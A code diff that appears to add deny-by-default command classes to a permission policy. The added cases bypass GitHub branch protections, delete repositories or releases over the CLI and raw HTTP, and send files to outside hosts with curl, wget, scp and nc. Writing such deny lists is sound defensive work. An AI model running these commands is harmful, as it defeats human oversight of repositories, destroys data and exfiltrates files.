@@ -325,6 +325,71 @@ export const SEMANTIC_CLASSES: readonly SemanticClass[] = [
       'glab mr create',
     ],
   },
+  /* PHASE-1 CLOSURE, AUTHORITY TIERS (2026-10-01). Defeating a protection is a bypass and has no administrable form;
+   * changing the rules, changing who may act, and destroying what the forge cannot recreate are administrable acts
+   * that are DENY by default. Each class is the act, spelled through every door the forge has. */
+  {
+    family: 'forge',
+    id: 'defeating a branch or repository protection',
+    floor: 'DENY',
+    cases: [
+      'gh pr merge 12 --squash --admin',
+      'az repos pr update --id 3 --status completed --bypass-policy true',
+      'gh api -X DELETE repos/o/r/branches/main/protection/enforce_admins',
+      'gh api -X PUT repos/o/r/branches/main/protection -F enforce_admins=false',
+      'gh api -X POST repos/o/r/rulesets -f name=x -f enforcement=disabled',
+      "gh api -X PUT repos/o/r/rulesets/5 -f 'bypass_actors[][actor_id]=1'",
+      `echo '{"enforce_admins": false}' | gh api -X PUT repos/o/r/branches/main/protection --input -`,
+    ],
+  },
+  {
+    family: 'forge',
+    // the SAME acts, sent with an HTTP client instead of a forge CLI: judged by the request, not by the tool's name
+    id: 'a forge act sent over raw HTTP',
+    floor: 'DENY',
+    cases: [
+      'curl -X PUT -H "Authorization: token abc" https://api.github.com/repos/o/r/pulls/3/merge',
+      'curl -X DELETE https://api.github.com/repos/o/r',
+      'curl -X POST https://api.github.com/repos/o/r/issues -d \'{"title":"x"}\'',
+      'curl -X PUT https://api.github.com/repos/o/r/branches/main/protection -d \'{"enforce_admins":false}\'',
+      'curl -X DELETE https://api.github.com/repos/o/r/branches/main/protection/enforce_admins',
+      'wget --method=DELETE https://api.github.com/repos/o/r',
+      'http DELETE api.github.com/repos/o/r',
+    ],
+  },
+  {
+    family: 'network',
+    id: 'a request that sends to a host that is not a declared local target',
+    floor: 'ASK',
+    cases: [
+      'curl -X POST https://example.com/hook -d x',
+      'curl -T backup.tgz https://example.com/up',
+      'wget --post-file=data.json https://example.com/x',
+      'http POST example.org/a b=1',
+      'scp data.json user@example.com:/srv/',
+      'rsync -av src/ user@example.com:/srv/',
+      'ssh user@example.com ls',
+      'nc example.com 4444 < data.json',
+    ],
+  },
+  {
+    family: 'forge',
+    id: 'the rules, the permissions and the existence of a repository',
+    floor: 'DENY',
+    cases: [
+      'gh api -X PUT repos/o/r/branches/main/protection -F enforce_admins=true',
+      'gh api -X DELETE repos/o/r/rulesets/5',
+      'gh api -X PUT repos/o/r/collaborators/bob -f permission=admin',
+      'gh api -X PATCH repos/o/r -f visibility=public',
+      'gh repo edit o/r --visibility public',
+      'gh repo delete o/r --yes',
+      'gh api -X DELETE repos/o/r',
+      'gh release delete v1.0.0 --yes',
+      'gh issue reopen 3',
+      'gh issue delete 3 --yes',
+      'gh api -X PUT repos/o/r/pulls/3/merge',
+    ],
+  },
   {
     family: 'fs',
     id: 'credential store read',
